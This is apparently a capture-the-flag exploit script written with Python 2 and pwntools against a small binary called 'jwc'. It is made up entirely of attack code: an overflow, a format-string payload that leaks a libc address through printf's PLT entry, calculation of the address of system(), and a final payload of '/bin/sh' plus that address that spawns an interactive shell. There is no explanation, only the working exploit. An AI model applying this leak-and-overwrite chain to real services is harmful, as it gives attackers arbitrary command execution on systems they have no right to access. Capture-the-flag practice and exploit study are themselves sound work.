from binascii import *
from pwn import *

r = process('./jwc')
#r = remote('192.168.56.101', 6666)

def opt(n):
	print r.recvuntil('exit')
	r.sendline(n)

opt('1')	#register	
print r.recvuntil('chars')
r.sendline('namname')
print r.recvuntil('self')
r.sendline('despppppppppppp')


opt('2')	#exam	math
print r.recvuntil('dota')
r.sendline('1')
print r.recvuntil('?')
r.sendline('104')
print r.recvuntil('OK')
r.sendline('c'*104)


opt('5')	#resit
print r.recvuntil('dota')
r.sendline('1')

opt('2')	#exam	math
print r.recvuntil('dota')
r.sendline('2')
print r.recvuntil('?')
r.sendline('4')
print r.recvuntil('OK')
r.sendline('abcd')

printf_plt = 0x4009B0
puts_got = 0x0602330

libc = ELF('/usr/lib/libc.so.6')
system_l = libc.symbols['system']
__libc_start_main_l = libc.symbols['__libc_start_main']


opt('1024')	#secret
print r.recvuntil(':)')
r.sendline('1')
payload  = ''
payload += '%11$pccc'
payload += 'aaaaaaaa'
payload += 'aaaaaaaa'
payload += p64(printf_plt)
r.sendline(payload)


opt('3')	#leak
print r.recvuntil('math: 0')
recv_data = r.recvuntil('en')
print (recv_data)

__libc_start_main_r = int((recv_data)[1:15],16)-240
system_r = system_l - __libc_start_main_l + __libc_start_main_r
log.info('__libc_start_main_r'+hex(__libc_start_main_r))
log.info('__libc_start_main_l'+hex(__libc_start_main_l))
log.info('system_l'+hex(system_l) )
log.info('system_r'+hex(system_r) )

opt('1024')	#secret
print r.recvuntil(':)')
r.sendline('1')
payload  = ''
payload += '/bin/sh\x00'
payload += 'aaaaaaaa'
payload += 'aaaaaaaa'
payload += p64(system_r)
r.sendline(payload)

opt('3')	#shell
r.interactive()
